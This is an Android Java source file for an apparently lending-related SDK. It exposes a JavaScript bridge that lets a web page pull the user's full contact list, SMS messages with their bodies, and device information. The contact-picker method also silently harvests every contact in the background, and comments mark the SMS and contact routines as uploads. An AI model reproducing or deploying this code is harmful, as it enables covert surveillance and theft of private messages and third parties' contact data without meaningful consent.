package com.mobp2p.mobp2psdk;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Telephony.Sms;
import android.util.Log;
import android.webkit.JavascriptInterface;

import com.mobp2p.mobp2psdk.Api.Api;
import com.mobp2p.mobp2psdk.base.HttpUtils;
import com.mobp2p.mobp2psdk.javabean.ContactBean;
import com.mobp2p.mobp2psdk.javabean.SMSItemBean;
import com.mobp2p.mobp2psdk.utils.MetaDataUtils;
import com.mobp2p.mobp2psdk.utils.SdkPreferences;

public class JavaScriptinterface {
	Activity c = null;
	private static String userPhone;
	List<ContactBean> mContactEntities = null;
	static Map<String, String> infoMap = new HashMap<String, String>();

	public JavaScriptinterface() {
		// TODO Auto-generated constructor stub
	}

	public JavaScriptinterface(Activity context) {
		// TODO Auto-generated constructor stub
		c = context;
	}

	public JavaScriptinterface(Activity context, String userPhone) {
		// TODO Auto-generated constructor stub
		c = context;
		this.userPhone = userPhone;
	}

	// 打开通讯录
	@JavascriptInterface
	public void openMList() {
		Intent contactimmediateBtnIntent = new Intent(Intent.ACTION_PICK,
				ContactsContract.Contacts.CONTENT_URI);
		c.startActivityForResult(contactimmediateBtnIntent, 999);
		new HookContact().execute();
	}

	// 设置电话和名字
	@JavascriptInterface
	public String setPhone() {
		return userPhone;
	}

	// 上传通讯录
	@JavascriptInterface
	public void getContact() {
		new HookContact().execute();
	}

	// 上传短信
	@JavascriptInterface
	public void OMG() {
		new HookSms().execute();
	}

	// 获取设备信息
	@JavascriptInterface
	public String setPhoneinfo() {
		Map<String, Object> map = MetaDataUtils.getInfos(c);
		StringBuffer params = new StringBuffer();
		Iterator it = map.entrySet().iterator();
		while (it.hasNext()) {
			Map.Entry element = (Map.Entry) it.next();
			params.append(element.getKey());
			params.append("=");
			params.append(element.getValue());
			params.append("&");
		}
		if (params.length() > 0) {
			params.deleteCharAt(params.length() - 1);
		}
		return params.toString();
	}

	class HookContact extends AsyncTask<Void, Void, Void> {
		@Override
		protected Void doInBackground(Void... params) {
			int count = Integer.parseInt(SdkPreferences
					.getUpdate_contacts_max());
			mContactEntities = new ArrayList<ContactBean>();
			Cursor cur = null;
			try {
				cur = c.getContentResolver().query(
						ContactsContract.Contacts.CONTENT_URI,
						null,
						null,
						null,
						ContactsContract.Contacts.DISPLAY_NAME
								+ " COLLATE LOCALIZED ASC");
				if (null != cur && cur.moveToFirst()) {
					int idColumn = cur
							.getColumnIndex(ContactsContract.Contacts._ID);
					int displayNameColumn = cur
							.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
					int len = 0;
					do {
						String contactId = cur.getString(idColumn);
						String disPlayName = cur.getString(displayNameColumn);
						int phoneCount = cur
								.getInt(cur
										.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
						if (phoneCount > 0) {
							Cursor phones = c
									.getContentResolver()
									.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
											null,
											ContactsContract.CommonDataKinds.Phone.CONTACT_ID
													+ " = " + contactId, null,
											null);
							if (phones.moveToFirst()) {
								String phoneNumber;
								do {
									ContactBean ce = new ContactBean();
									phoneNumber = phones
											.getString(phones
													.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
									long updatedtime = phones
											.getLong(phones
													.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
									ce.setTelNumber(phoneNumber);
									ce.setContactName(disPlayName);
									mContactEntities.add(ce);
								} while (phones.moveToNext());
							}
							if (null != phones) {
								phones.close();
							}
						}
						len += 1;
					} while (cur.moveToNext() && len < count);
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				if (null != cur) {
					cur.close();
				}
			}
			// 通讯录的
			JSONArray mArray = new JSONArray();
			if (null != mContactEntities && mContactEntities.size() > 0) {
				for (ContactBean temp : mContactEntities) {
					JSONObject mObject = new JSONObject();
					try {
						mObject.put("tel", temp.getContactTel());
						mObject.put("name", temp.getContactName());
						mArray.put(mObject);
					} catch (JSONException e) {
						e.printStackTrace();
					}
				}
				infoMap.put("contacts", mArray.toString());
			}
			return null;
		}
	}

	@JavascriptInterface
	public String getContacts() {
		return infoMap.get("contacts");
	}

	@JavascriptInterface
	public String getSms() {
		return infoMap.get("sms");
	}

	class HookSms extends AsyncTask<Void, Void, Void> {
		@Override
		protected Void doInBackground(Void... params) {
			// TODO Auto-generated method stub
			final String SMS_URI_ALL = "content://sms/";
			int count = Integer.parseInt(SdkPreferences.getUpdate_sms_max());
			ArrayList<SMSItemBean> smeArrayList = new ArrayList<SMSItemBean>();
			try {
				Uri uri = Uri.parse(SMS_URI_ALL);
				String[] projection = new String[] { "_id", "address",
						"person", "body", "date", "type" };
				Cursor cur;
				long day = 0;
				cur = c.getContentResolver().query(uri, projection,
						"date<=" + System.currentTimeMillis(), null,
						"date desc");
				// 获取手机内部短信
				if (null != cur && cur.moveToFirst()) {
					int indexAddress = cur.getColumnIndex("address");
					int indexBody = cur.getColumnIndex("body");
					int indexDate = cur.getColumnIndex("date");
					int indexType = cur.getColumnIndex("type");
					cur.getColumnIndex(Sms.PERSON);
					int len = 0;
					do {
						String strAddress = cur.getString(indexAddress);
						String strbody = cur.getString(indexBody);
						long longDate = cur.getLong(indexDate);
						int intType = cur.getInt(indexType);
						SimpleDateFormat dateFormat = new SimpleDateFormat(
								"yyyy-MM-dd hh:mm:ss");
						Date d = new Date(longDate);
						String strDate = dateFormat.format(d);
						smeArrayList.add(new SMSItemBean(strAddress, strbody,
								strDate, intType));
						len += 1;
					} while (cur.moveToNext() && len < count);
					if (smeArrayList != null) {
						int ien = smeArrayList.size();
						if (ien > 0) {
							// 短信的
							JSONArray mJsonArray = new JSONArray();
							for (int i = 0; i < ien; i++) {
								SMSItemBean temp = smeArrayList.get(i);
								JSONObject mObject = new JSONObject();
								try {
									mObject.put("phone", temp.getPhonenumber());
									mObject.put("type", temp.getType());
									mObject.put("content", temp.getContent());
									mObject.put("calltime", temp.getTime());
								} catch (JSONException e) {
									e.printStackTrace();
								}
								mJsonArray.put(mObject);
							}
							infoMap.put("sms", mJsonArray.toString());
						}
					}
					if (!cur.isClosed()) {
						cur.close();
					}
				}
			} catch (SQLiteException ex) {
				ex.printStackTrace();
			}
			return null;
		}
	}
}
